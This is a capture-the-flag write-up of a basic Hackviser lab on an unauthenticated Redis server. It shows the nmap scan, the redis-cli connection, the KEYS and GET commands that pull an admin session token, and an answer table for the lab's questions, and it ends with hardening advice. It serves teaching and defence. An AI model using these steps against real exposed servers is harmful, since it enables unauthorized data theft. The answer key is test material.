# Reddict - Warmup Writeup

**Platform:** Hackviser | **Category:** Warmups | **Difficulty:** Basic | **Points:** 17  
**Topic:** Redis Security Misconfiguration  



## Overview

This challenge involved identifying and exploiting an unauthenticated Redis instance exposed on a target machine. The goal was to perform network reconnaissance, establish a connection to the database service, and extract sensitive session data belonging to an admin user.



## Methodology

### 1. Environment Setup
Connected to the target environment using OpenVPN.

```bash
openvpn siber_vatan.ovpn
```

### 2. Reconnaissance
Performed a service version scan across the first 10,000 ports to identify running services on the target host (`172.20.6.125`).

```bash
nmap -sV -p1-10000 172.20.6.125
```

**Finding:** Port `6379` was open, running **Redis 6.0.16** with no authentication.

### 3. Service Interaction
Connected to the Redis instance using the `redis-cli` tool.

```bash
redis-cli -h 172.20.6.125
```

Verified the connection was live:
```
PING → PONG
```

### 4. Information Gathering
Used the `INFO` command to retrieve server metadata including OS, version, uptime, and configuration file paths.

```
INFO
```

### 5. Data Extraction
Listed all stored keys in the database:

```
KEYS *
```

The keyspace revealed 11 key-value pairs stored without any encryption or access control. One key (`session:admin-001`) was the answer of a question.

Retrieved its contents using:

```
GET session:admin-001
```

**Result:**
```
"{\"userID\": \"001\", \"lastLogin\": \"2023-12-10T10:10:01\", \"sessionToken\": \"iqtoggtry\", \"isLoggedIn\": true}"
```

## Findings Summary

| # | Question | Answer |
|---|----------|--------|
| 1 | Open port | `6379` |
| 2 | Redis version | `6.0.16` |
| 3 | Connection tool | `redis-cli` |
| 4 | PING response | `PONG` |
| 5 | Server info command | `INFO` |
| 6 | List all keys command | `KEYS *` |
| 7 | Total key-value pairs | `11` |
| 8 | Read key value command | `GET` |
| 9 | Admin session token | `iqtoggtry` |


## Security Recommendations

This exercise highlighted several critical misconfigurations that would pose serious risk in a real-world environment:

1. **Authentication**: Redis should require a strong password with the `requirepass` directive.
2. **Network Binding**: The service should be bound to `127.0.0.1` only, preventing external access.
3. **Data Encryption**: Sensitive values such as session tokens should be always encrypted when storing.
4. **Principle of Least Privilege**: Access to the Redis instance should be restricted.

A properly hardened configuration would look like following:
```
bind 127.0.0.1
requirepass StrongPasswordHere
```
